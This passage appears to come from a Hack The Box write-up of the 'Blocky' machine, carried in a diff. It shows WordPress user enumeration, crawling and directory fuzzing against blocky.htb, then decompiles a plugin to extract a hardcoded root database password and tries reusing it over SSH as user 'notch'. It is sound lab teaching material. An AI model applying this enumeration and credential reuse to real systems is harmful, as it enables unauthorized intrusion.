+</span><span class="z-text z-plain"> | Style Name: Twenty Seventeen
+</span><span class="z-text z-plain"> | Style URI: https://wordpress.org/themes/twentyseventeen/
+</span><span class="z-text z-plain"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+</span><span class="z-text z-plain"> | Author: the WordPress team
+</span><span class="z-text z-plain"> | Author URI: https://wordpress.org/
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | Found By: Css Style In Homepage (Passive Detection)
+</span><span class="z-text z-plain"> |
+</span><span class="z-text z-plain"> | Version: 1.3 (80% confidence)
+</span><span class="z-text z-plain"> | Found By: Style (Passive Detection)
+</span><span class="z-text z-plain"> |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: &#39;Version: 1.3&#39;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating Vulnerable Plugins (via Passive Methods)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] No plugins Found.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
+</span><span class="z-text z-plain"> Checking Known Locations - Time: 00:00:03 &lt;============================================================================================================================================================&gt; (638 / 638) 100.00% Time: 00:00:03
+</span><span class="z-text z-plain">[+] Checking Theme Versions (via Passive and Aggressive Methods)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] No themes Found.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
+</span><span class="z-text z-plain"> Checking Known Locations - Time: 00:00:15 &lt;==========================================================================================================================================================&gt; (2575 / 2575) 100.00% Time: 00:00:15
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] No Timthumbs Found.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+</span><span class="z-text z-plain"> Checking Config Backups - Time: 00:00:00 &lt;=============================================================================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] No Config Backups Found.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating DB Exports (via Passive and Aggressive Methods)
+</span><span class="z-text z-plain"> Checking DB Exports - Time: 00:00:00 &lt;===================================================================================================================================================================&gt; (75 / 75) 100.00% Time: 00:00:00
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] No DB Exports Found.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)
+</span><span class="z-text z-plain"> Brute Forcing Attachment IDs - Time: 00:00:01 &lt;========================================================================================================================================================&gt; (100 / 100) 100.00% Time: 00:00:01
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] No Medias Found.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Enumerating Users (via Passive and Aggressive Methods)
+</span><span class="z-text z-plain"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==============================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[i] User(s) Identified:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] notch
+</span><span class="z-text z-plain"> | Found By: Author Posts - Author Pattern (Passive Detection)
+</span><span class="z-text z-plain"> | Confirmed By:
+</span><span class="z-text z-plain"> |  Wp Json Api (Aggressive Detection)
+</span><span class="z-text z-plain"> |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+</span><span class="z-text z-plain"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+</span><span class="z-text z-plain"> |  Login Error Messages (Aggressive Detection)
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[+] Notch
+</span><span class="z-text z-plain"> | Found By: Rss Generator (Passive Detection)
+</span><span class="z-text z-plain"> | Confirmed By: Login Error Messages (Aggressive Detection)
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h4 id="exploration-1">Exploration</h4>
+<p>If we browse the website, we only find a post by <code>notch</code> indicating that the
+website is under construction. That's all. No comments, or anything like that.</p>
+<h4 id="site-crawling">Site crawling</h4>
+<p>Let's see if we can find any linked web pages or directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://blocky.htb/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">http://blocky.htb/
+</span><span class="z-text z-plain">http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2
+</span><span class="z-text z-plain">http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0
+</span><span class="z-text z-plain">http://blocky.htb/wp-content/themes/twentyseventeen/assets/js/global.js?ver=1.0
+</span><span class="z-text z-plain">http://blocky.htb/wp-includes/wlwmanifest.xml
+</span><span class="z-text z-plain">http://blocky.htb/wp-includes/js/wp-embed.min.js?ver=4.8
+</span><span class="z-text z-plain">http://blocky.htb/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1
+</span><span class="z-text z-plain">http://blocky.htb/xmlrpc.php?rsd
+</span><span class="z-text z-plain">http://blocky.htb/index.php/comments/feed/
+</span><span class="z-text z-plain">http://blocky.htb/wp-login.php
+</span><span class="z-text z-plain">http://blocky.htb/index.php/feed/
+</span><span class="z-text z-plain">http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+</span><span class="z-text z-plain">http://blocky.htb/wp-includes/js/jquery/jquery.js?ver=1.12.4
+</span><span class="z-text z-plain">http://blocky.htb/wp-login.php?action=lostpassword
+</span><span class="z-text z-plain">http://blocky.htb/index.php/wp-json/
+</span><span class="z-text z-plain">http://blocky.htb/wp-admin/load-styles.php?c=1&amp;dir=ltr&amp;load%5B%5D=dashicons,buttons,forms,l10n,login&amp;ver=4.8
+</span><span class="z-text z-plain">http://blocky.htb/index.php/2017/07/
+</span><span class="z-text z-plain">http://blocky.htb/index.php/category/uncategorized/
+</span><span class="z-text z-plain">http://blocky.htb/index.php/2017/07/02/welcome-to-blockycraft/
+</span><span class="z-text z-plain">http://blocky.htb/
+</span><span class="z-text z-plain">http://blocky.htb/a
+</span><span class="z-text z-plain">http://blocky.htb/wp-includes/js/comment-reply.min.js?ver=4.8
+</span><span class="z-text z-plain">http://blocky.htb/xmlrpc.php
+</span><span class="z-text z-plain">http://blocky.htb/index.php/2017/07/02/welcome-to-blockycraft/feed/
+</span><span class="z-text z-plain">http://blocky.htb/index.php/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fblocky.htb%2Findex.php%2F2017%2F07%2F02%2Fwelcome-to-blockycraft%2F&amp;format=xml
+</span><span class="z-text z-plain">http://blocky.htb/index.php/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fblocky.htb%2Findex.php%2F2017%2F07%2F02%2Fwelcome-to-blockycraft%2F
+</span><span class="z-text z-plain">http://blocky.htb/index.php/author/notch/
+</span><span class="z-text z-plain">http://blocky.htb/?p=5
+</span></code></pre>
+<p>We find a few web pages, however none of them look particularly noteworthy.</p>
+<h4 id="directory-fuzzing">Directory fuzzing</h4>
+<p>Let's see if this website hides unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://blocky.htb/FUZZ<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>mc</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>100-403,405-599<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/,.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 403, Size: 291, Words: 22, Lines: 12, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/icons/
+</span><span class="z-text z-plain">    * FUZZ: icons/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 380, Words: 46, Lines: 11, Duration: 26ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wiki/
+</span><span class="z-text z-plain">    * FUZZ: wiki/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 26ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wiki
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/wiki/
+</span><span class="z-text z-plain">    * FUZZ: wiki
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 31ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-content
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/wp-content/
+</span><span class="z-text z-plain">    * FUZZ: wp-content
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 39ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-content/
+</span><span class="z-text z-plain">    * FUZZ: wp-content/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 2397, Words: 147, Lines: 70, Duration: 181ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-login.php
+</span><span class="z-text z-plain">    * FUZZ: wp-login.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 4278ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/index.php
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/
+</span><span class="z-text z-plain">    * FUZZ: index.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/plugins
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/plugins/
+</span><span class="z-text z-plain">    * FUZZ: plugins
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 745, Words: 36, Lines: 38, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/plugins/
+</span><span class="z-text z-plain">    * FUZZ: plugins/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 67ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-includes
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/wp-includes/
+</span><span class="z-text z-plain">    * FUZZ: wp-includes
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 40838, Words: 2372, Lines: 201, Duration: 167ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-includes/
+</span><span class="z-text z-plain">    * FUZZ: wp-includes/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 296, Words: 22, Lines: 12, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/javascript/
+</span><span class="z-text z-plain">    * FUZZ: javascript/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/javascript
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/javascript/
+</span><span class="z-text z-plain">    * FUZZ: javascript
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 135, Words: 11, Lines: 5, Duration: 78ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-trackback.php
+</span><span class="z-text z-plain">    * FUZZ: wp-trackback.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-admin
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/wp-admin/
+</span><span class="z-text z-plain">    * FUZZ: wp-admin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 259ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-admin/
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/wp-login.php?redirect_to=http%3A%2F%2Fblocky.htb%2Fwp-admin%2F&amp;reauth=1
+</span><span class="z-text z-plain">    * FUZZ: wp-admin/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 28ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/phpmyadmin
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/phpmyadmin/
+</span><span class="z-text z-plain">    * FUZZ: phpmyadmin
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 10327, Words: 492, Lines: 26, Duration: 476ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/phpmyadmin/
+</span><span class="z-text z-plain">    * FUZZ: phpmyadmin/
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 79ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/xmlrpc.php
+</span><span class="z-text z-plain">    * FUZZ: xmlrpc.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 30ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/.php
+</span><span class="z-text z-plain">    * FUZZ: .php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 119ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb//
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/
+</span><span class="z-text z-plain">    * FUZZ: /
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 52227, Words: 3306, Lines: 314, Duration: 174ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/
+</span><span class="z-text z-plain">    * FUZZ: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 66ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/wp-signup.php
+</span><span class="z-text z-plain">| --&gt; | http://blocky.htb/wp-login.php?action=register
+</span><span class="z-text z-plain">    * FUZZ: wp-signup.php
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 31ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/server-status
+</span><span class="z-text z-plain">    * FUZZ: server-status
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 32ms]
+</span><span class="z-text z-plain">| URL | http://blocky.htb/server-status/
+</span><span class="z-text z-plain">    * FUZZ: server-status/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We get a few hits that might be worth investigating.</p>
+<h4 id="exploration-2">Exploration</h4>
+<p>Back to the website, if we browse to <code>/plugins/</code>, we get something interesting:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/blocky/domain-plugins-folder.png" alt="Domain plugins folder" /></p>
+<p>We find two Minecraft plugins named <code>BlockyCore.jar</code> and
+<code>griefprevention-1.11.2-3.1.1.298.jar</code>. Let's download them.</p>
+<h4 id="inspecting-blockycore-jar">Inspecting <code>BlockyCore.jar</code></h4>
+<p>I assume that <code>griefprevention-1.11.2-3.1.1.298.jar</code> is a third-party plugin
+used by the developers of the server. However, <code>BlockyCore.jar</code> is likely
+custom, so it might contain valuable information.</p>
+<p>Let's unzip it and get the structure of the <code>.jar</code> file:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> tree<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/BlockyCore<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">/workspace/BlockyCore
+</span><span class="z-text z-plain">├── META-INF
+</span><span class="z-text z-plain">│   └── MANIFEST.MF
+</span><span class="z-text z-plain">└── com
+</span><span class="z-text z-plain">    └── myfirstplugin
+</span><span class="z-text z-plain">        └── BlockyCore.class
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>BlockyCore.class</code> file is probably the one holding the code — or rather,
+the bytecode.</p>
+<p>Let's use IntelliJ IDEA to decompile this file:</p>
+<pre data-lang="java" class="language-java z-code"><code class="language-java" data-lang="java"><span class="z-source z-java"><span class="z-meta z-package-declaration z-java"><span class="z-keyword z-other z-package z-java">package</span> <span class="z-meta z-path z-java"><span class="z-entity z-name z-namespace z-java">com<span class="z-punctuation z-accessor z-dot z-java">.</span>myfirstplugin</span></span></span><span class="z-punctuation z-terminator z-java">;</span>
+</span><span class="z-source z-java">
+</span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-class z-identifier z-java"><span class="z-storage z-type z-java">class</span> <span class="z-entity z-name z-class z-java">BlockyCore</span></span> <span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-support z-class z-java">String</span> <span class="z-meta z-field z-java">sqlHost</span> <span class="z-meta z-assignment z-rhs z-java"><span class="z-keyword z-operator z-assignment z-java">=</span> <span class="z-string z-quoted z-double z-java"><span class="z-punctuation z-definition z-string z-begin z-java">&quot;</span>localhost<span class="z-punctuation z-definition z-string z-end z-java">&quot;</span></span></span><span class="z-punctuation z-terminator z-java">;</span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-support z-class z-java">String</span> <span class="z-meta z-field z-java">sqlUser</span> <span class="z-meta z-assignment z-rhs z-java"><span class="z-keyword z-operator z-assignment z-java">=</span> <span class="z-string z-quoted z-double z-java"><span class="z-punctuation z-definition z-string z-begin z-java">&quot;</span>root<span class="z-punctuation z-definition z-string z-end z-java">&quot;</span></span></span><span class="z-punctuation z-terminator z-java">;</span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-support z-class z-java">String</span> <span class="z-meta z-field z-java">sqlPass</span> <span class="z-meta z-assignment z-rhs z-java"><span class="z-keyword z-operator z-assignment z-java">=</span> <span class="z-string z-quoted z-double z-java"><span class="z-punctuation z-definition z-string z-begin z-java">&quot;</span>8YsqfCTnvxAUeduzjNSXe22<span class="z-punctuation z-definition z-string z-end z-java">&quot;</span></span></span><span class="z-punctuation z-terminator z-java">;</span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-method z-java"><span class="z-meta z-method z-identifier z-java"><span class="z-entity z-name z-function z-constructor z-java">BlockyCore</span></span><span class="z-meta z-method z-parameters z-java"><span class="z-meta z-parens z-java"><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span></span> <span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span></span></span></span><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">
+</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">    <span class="z-punctuation z-section z-block z-end z-java">}</span></span></span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-method z-java"><span class="z-storage z-type z-void z-java">void</span> <span class="z-meta z-method z-identifier z-java"><span class="z-entity z-name z-function z-java">onServerStart</span></span><span class="z-meta z-method z-parameters z-java"><span class="z-meta z-parens z-java"><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span></span> <span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span></span></span></span><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">
+</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">    <span class="z-punctuation z-section z-block z-end z-java">}</span></span></span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-method z-java"><span class="z-storage z-type z-void z-java">void</span> <span class="z-meta z-method z-identifier z-java"><span class="z-entity z-name z-function z-java">onServerStop</span></span><span class="z-meta z-method z-parameters z-java"><span class="z-meta z-parens z-java"><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span></span> <span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span></span></span></span><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">
+</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">    <span class="z-punctuation z-section z-block z-end z-java">}</span></span></span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-method z-java"><span class="z-storage z-type z-void z-java">void</span> <span class="z-meta z-method z-identifier z-java"><span class="z-entity z-name z-function z-java">onPlayerJoin</span></span><span class="z-meta z-method z-parameters z-java"><span class="z-meta z-parens z-java"><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span></span> <span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span></span></span></span><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">
+</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">        <span class="z-variable z-language z-java">this</span><span class="z-punctuation z-accessor z-dot z-java">.</span><span class="z-meta z-function-call z-java"><span class="z-variable z-function z-java">sendMessage</span><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-string z-quoted z-double z-java"><span class="z-punctuation z-definition z-string z-begin z-java">&quot;</span>TODO get username<span class="z-punctuation z-definition z-string z-end z-java">&quot;</span></span><span class="z-punctuation z-separator z-comma z-java">,</span> <span class="z-string z-quoted z-double z-java"><span class="z-punctuation z-definition z-string z-begin z-java">&quot;</span>Welcome to the BlockyCraft!!!!!!!<span class="z-punctuation z-definition z-string z-end z-java">&quot;</span></span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span><span class="z-punctuation z-terminator z-java">;</span>
+</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">    <span class="z-punctuation z-section z-block z-end z-java">}</span></span></span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java">    <span class="z-storage z-modifier z-java">public</span> <span class="z-meta z-method z-java"><span class="z-storage z-type z-void z-java">void</span> <span class="z-meta z-method z-identifier z-java"><span class="z-entity z-name z-function z-java">sendMessage</span></span><span class="z-meta z-method z-parameters z-java"><span class="z-meta z-parens z-java"><span class="z-punctuation z-section z-parens z-begin z-java">(</span><span class="z-support z-class z-java">String</span> <span class="z-variable z-parameter z-java">username</span><span class="z-punctuation z-separator z-comma z-java">,</span> <span class="z-support z-class z-java">String</span> <span class="z-variable z-parameter z-java">message</span><span class="z-punctuation z-section z-parens z-end z-java">)</span></span></span> <span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java"><span class="z-punctuation z-section z-block z-begin z-java">{</span></span></span></span><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">
+</span></span></span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-meta z-method z-java"><span class="z-meta z-method z-body z-java">    <span class="z-punctuation z-section z-block z-end z-java">}</span></span></span>
+</span></span></span></span><span class="z-source z-java"><span class="z-meta z-class z-java"><span class="z-meta z-class z-body z-java"><span class="z-meta z-block z-java"><span class="z-punctuation z-section z-block z-end z-java">}</span></span></span></span>
+</span></code></pre>
+<p>We find credentials! The <code>sqlHost</code>, <code>sqlUser</code> and <code>sqlPass</code> attributes indicate
+that this plugin connects to a SQL database locally using the credentials
+<code>root</code>:<code>8YsqfCTnvxAUeduzjNSXe22</code> (not yet implemented).</p>
+<h2 id="foothold-ssh">Foothold (SSH)</h2>
+<p>If we try to connect to Blocky over SSH using these credentials, it fails.</p>
+<p>However, we found in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/blocky/#wordpress">WordPress</a> section that <code>notch</code> was a user
+on the website (in fact, the only one). Since he wrote the post indicating that
+the website and server were under construction, we must be the administrator,
+and likely also the developer. Maybe he reused his credentials to connect to the
+SQL database?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ssh <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>notch@10.10.10.37<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
